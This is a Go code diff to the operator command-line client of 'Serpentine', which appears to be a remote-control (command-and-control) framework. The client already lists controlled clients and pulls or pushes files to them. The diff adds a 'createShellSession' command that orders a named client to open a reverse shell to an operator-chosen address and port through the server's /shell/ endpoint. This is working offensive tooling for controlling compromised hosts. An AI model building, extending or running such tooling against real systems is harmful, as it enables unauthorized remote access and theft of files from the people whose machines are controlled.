@@ -9,7 +9,6 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"strconv"
 )
 
 var serverAddress string
@@ -19,20 +18,23 @@ func main() {
 	initLogger()
 
 	serverAddressLocal := flag.String("serverAddress", "127.0.0.1", "Address of Serpentine server")
-	serverPortLocal := flag.Int("serverPort", 8080, "Port of Serpentine server")
+	serverPortLocal := flag.String("serverPort", "8080", "Port of Serpentine server")
 	showClients := flag.Bool("showClients", false, "Show clients")
+	getFile := flag.Bool("getFile", false, "Get a file from a client")
+	putFile := flag.Bool("putFile", false, "Upload a file to a client")
+	createShellSession := flag.Bool("createShellSession", false, "Creates a reverse shell session")
+	shellAddress := flag.String("shellAddress", "", "Address reverse shell will connect to")
+	shellPort := flag.String("shellPort", "", "Port reverse shell will connect to")
 	clientName := flag.String("clientName", "", "Name of client to operate on")
 	changeClientName := flag.Bool("changeClientName", false, "Change name of the client")
 	newClientName := flag.String("newClientName", "", "New name to set on client, required for 'changeClientName' command")
-	getFile := flag.Bool("getFile", false, "Get a file from a client")
-	putFile := flag.Bool("putFile", false, "Upload a file to a client")
 	remoteFilePath := flag.String("remoteFilePath", "", "Path to a file on client")
 	localFilePath := flag.String("localFilePath", "", "Path to a local file")
 
 	flag.Parse()
 
 	serverAddress = *serverAddressLocal
-	serverPort = strconv.Itoa(*serverPortLocal)
+	serverPort = *serverPortLocal
 
 	if *showClients {
 		doShowClients()
@@ -53,9 +55,32 @@ func main() {
 			log.Error("'clientName', 'localFilePath', and 'remoteFilePath' parameters are required for 'putFile' command")
 		}
 		doPutFile(*clientName, *localFilePath, *remoteFilePath)
+	} else if *createShellSession {
+		if *clientName == "" || *shellAddress == "" || *shellPort == "" {
+			log.Error("'clientName', 'shellAddress', and 'shellPort' parameters are required for 'createShellSession' command")
+		} else {
+			doCreateShellSession(*clientName, *shellAddress, *shellPort)
+		}
 	} else {
 		flag.PrintDefaults()
 	}
+}
+
+func doCreateShellSession(clientName string, shellAddress string, shellPort string) {
+	req, err := json.Marshal(map[string]string{
+		"address": shellAddress,
+		"port":    shellPort,
+	})
+	if err != nil {
+		log.Error(err)
+		return
+	}
+	resp, err := http.Post("http://"+serverAddress+":"+serverPort+"/shell/"+clientName, "application/json", bytes.NewBuffer(req))
+	if err != nil {
+		log.Error(err)
+		return
+	}
+	defer resp.Body.Close()
 }
 
 func doPutFile(clientName string, localFilePath string, remoteFilePath string) {
